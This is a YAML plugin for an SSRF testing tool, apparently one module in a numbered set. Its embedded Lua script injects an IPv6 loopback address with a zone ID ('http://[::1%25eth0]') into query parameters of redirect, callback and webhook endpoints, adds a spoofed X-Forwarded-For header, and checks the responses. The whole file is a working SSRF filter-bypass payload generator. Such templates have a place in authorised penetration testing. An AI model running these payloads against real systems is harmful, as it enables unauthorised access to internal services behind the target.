# 45_ipv6_zone.yaml
meta:
  id: ipv6_zone
  version: 2
  name: "IPv6 with Zone ID"
  description: "Uses IPv6 with zone ID (::1%eth0)"
  author: "SSRFdevil"
  created: "2026-06-19"
  updated: "2026-07-21"
  rank: 103
  confidence: 75
  severity: high
  tags: [ipv6, zone-id, bypass]
  references: []
  success_indicator: []
  failure_indicator:
    - "literal:Internal Admin Interface"
    - "literal:<html"
    - "literal:<!DOCTYPE"
    - "literal:404"
    - "literal:Access Denied"
    - "literal:Forbidden"

match:
  schemes: [http, https]
  kinds: [Endpoint]
  allowed_methods: [GET, POST]
  required_tags: [Redirect, Callback, Webhook]
  require_params: true

script:
  language: lua
  entry: run_batch
  source: |
    function run_batch(targets)
        local results = {}
        local payload_vector = "http://[::1%25eth0]"

        for _, target in ipairs(targets) do
            local base_url = target.url

            for _, param in ipairs(target.params) do
                local new_url = base_url

                if param.location == "Query" then
                    local pattern = param.name .. "=[^&]*"
                    local safe_vector = payload_vector:gsub("%%", "%%%%")
                    local replacement = param.name .. "=" .. safe_vector
                    if new_url:find(pattern) then
                        new_url = new_url:gsub(pattern, replacement)
                    else
                        local sep = new_url:find("%?") and "&" or "?"
                        new_url = new_url .. sep .. replacement
                    end
                end
                table.insert(results, {
                    url = new_url,
                    method = target.method or "GET",
                    headers = {
                        ["X-Forwarded-For"] = "[::1%25eth0]",
                    },
                })
            end
        end
        return results
    end
